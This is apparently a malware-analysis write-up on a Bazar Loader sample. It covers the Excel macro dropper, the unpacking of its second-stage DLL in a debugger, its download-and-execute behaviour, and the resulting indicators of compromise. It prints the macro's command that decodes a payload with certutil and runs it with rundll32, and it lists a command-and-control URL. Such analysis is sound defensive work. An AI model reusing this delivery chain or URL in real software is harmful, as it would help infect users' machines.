---
title: Bazar Loader
date: 2023-06-7 00:00:00 +0800
categories: [Malware, Downloader]
tags: [real_sample, excel, xlsb, macro, dll, upx, unpacking]
toc: true
---

# First Stage

## File Info

File Type:  `Microsoft Excel 2007+`

MD5: `3b409c892001c72d4b1be7786cedf010`

File Size: `290KB`

## Analysis

Run oleid show no VBA macros or xml macros

![image 3](/assets/img/posts/bazar_loader/3.png)

Try to open the file Microsoft excel  

![image 1](/assets/img/posts/bazar_loader/1.png)

It show a social engineering message to make the victim click on `enable content`   

And one sheet is visible but click right click on the sheet name show a menu with option to unhide sheets 

![image 2](/assets/img/posts/bazar_loader/2.png)

now all sheets are visible and we can go to the `auto_open` cell

the auto open is on sheet 7 and start from A1 Cell

![image 4](/assets/img/posts/bazar_loader/4.png)

But this sheet is protect by a password and can't show display the hidden columns but using a small trick we can see the macro without breaking the password of the file using the arrow to navigate the column cell by cell

at cell `A11`

![image 5](/assets/img/posts/bazar_loader/5.png)

as the name say it will save a copy of the sheet at `C:\Users\Public\105011.oop`

and at cell `A35`

![image 6](/assets/img/posts/bazar_loader/6.png)

it will make another copy at `C:\Users\Public\105011.xlsb`

Then unhide `from` sheet

![image 7](/assets/img/posts/bazar_loader/7.png)


and wait for 5 seconds 

![image 8](/assets/img/posts/bazar_loader/8.png)

Then runs this command

![image 9](/assets/img/posts/bazar_loader/9.png)

```
call('Kernel32', 'WinExec', 'JCJ', 'cmd.exe /c certutil -decode %PUBLIC%\133542.oop %PUBLIC%\133542.gof && rundll32.exe %PUBLIC%\105011.gof,DF')
```


### ProcMon

now `enable content` while running procmon to monitor all the file activity 

Here is the first file `.oop`

![image 10](/assets/img/posts/bazar_loader/10.png)

And the second one `.xlsb`

![image 11](/assets/img/posts/bazar_loader/11.png)

And the process create to decode it 

![image 12](/assets/img/posts/bazar_loader/12.png)

Rundll process

![image 13](/assets/img/posts/bazar_loader/13.png)

now this all for the file 
move the analysis to the dll


# Second Stage

## File Info

File Type: `32bit DLL`

Dll_Exports: DF1

Open the DLL in `pestudio`

![image 14](/assets/img/posts/bazar_loader/14.png)

notice a UPX section names and a self modifying section 

## Unpacking

Unpacking using upx 
```
upx -d stage2.dll -o stage2-unpacked.dll
```


Now open the unpacked file in `pestudio` and looking at imports and strings no clear strings are found in the sample 

![image 16](/assets/img/posts/bazar_loader/16.png)

look at the file in `detect it easy`  

![image 15](/assets/img/posts/bazar_loader/15.png)

the entropy indicate that the file maybe still packed and need to be unpacked again

to start the unpack first change the ASLR to false at `pestudio` 

![image 17](/assets/img/posts/bazar_loader/17.png)

to prevent the address from changing while debugging 

looking at the file at ida at get the address of `DF1` at `1000106A`

![image 18](/assets/img/posts/bazar_loader/18.png)

load the file at x32dbg and from settings -> preference

set breakpoint at DLL entry

![image 19](/assets/img/posts/bazar_loader/19.png)

now hit run `f9` to hit the entrypoint of the dll then change the `EIP` to `DF1` address 

![image 20](/assets/img/posts/bazar_loader/20.png)

Now hit `ctrl + g`  and search for `virtualAlloc`

![image 21](/assets/img/posts/bazar_loader/21.png)

then follow the jump and set a breakpoint at the return 

![image 22](/assets/img/posts/bazar_loader/22.png)

and set breakpoint at virtual protect using `bp VirtualProtect` at command bar

![image 23](/assets/img/posts/bazar_loader/23.png)


and now we are ready to hit run

first breakpoint to hit at virtualAlloc 

Right click on `EAX` and follow at dump one

![image 24](/assets/img/posts/bazar_loader/24.png)

hit run again

we hit the same breakpoint 

Follow `EAX` at dump2 and hit run 

![image 25](/assets/img/posts/bazar_loader/25.png)

and again the same breakpoint but this time we could notice that the dump2 contains an exe  start with MZ magic bytes

![image 26](/assets/img/posts/bazar_loader/26.png)


now i will follow dump2 address at memory map and right click on it and save memory to file

now checking it using `pestudio` libraries include `ws2_32.dll`

![image 28](/assets/img/posts/bazar_loader/28.png)


and imported function contains network related functions 

![image 29](/assets/img/posts/bazar_loader/29.png)

and finally strings 

![image 30](/assets/img/posts/bazar_loader/30.png)

## Analysis

Load the file into `IDA` 

At `DLLEntryPoint` it will call `sub_100011A0`

![image 31](/assets/img/posts/bazar_loader/31.png)

Now in this function it will start by dynamically loading libraries and resolve function address then call another 2 functions

![image 34](/assets/img/posts/bazar_loader/34.png)


First one will create directory at `C:\ProgramData\erihds`

![image 36](/assets/img/posts/bazar_loader/36.png)


Now return to the next function

![image 38](/assets/img/posts/bazar_loader/38.png)

It have what seems like a URL and a file path, and it will call `sub_10001640` twice 

Take a look at `sub_10001640`

![image 39](/assets/img/posts/bazar_loader/39.png)

start by calling `sub_10001470` and pass to it the url 

At this function it will take a url and extract the port, domain name, and path 

![image 40](/assets/img/posts/bazar_loader/40.png)

now back to previous function

![image 41](/assets/img/posts/bazar_loader/41.png)

it will prepare an HTTP request to the url with content as `ping` and send it 

![image 43](/assets/img/posts/bazar_loader/43.png)

then it will start recv all the content 

and `sub_100013A0` will remove any extra newlines 

![image 45](/assets/img/posts/bazar_loader/45.png)

back to `sub_100010B0` it will call `sub_10001640` twice one to get the url and the second to download a pe file

![image 46](/assets/img/posts/bazar_loader/46.png)


After it download the PE it will call `sub_10001350` and `sub_100012B0`

First function will save the buffer to the path we found before

![image 47](/assets/img/posts/bazar_loader/47.png)

And the second will execute it

![image 48](/assets/img/posts/bazar_loader/48.png)


# IoC

## Host Based

### Files

`C:\Users\Public\<RANDOM_NUMBER>.oop`

`C:\Users\Public\<RANDOM_NUMBER>.xlsb`

`C:\Users\Public\<RANDOM_NUMBER>.gof`

`C:\ProgramData\erihds\erihds.exe`

### Dirs

`C:\ProgramData\erihds\`


## Network Based

`http://idea5.xyz/campo/id/id8`

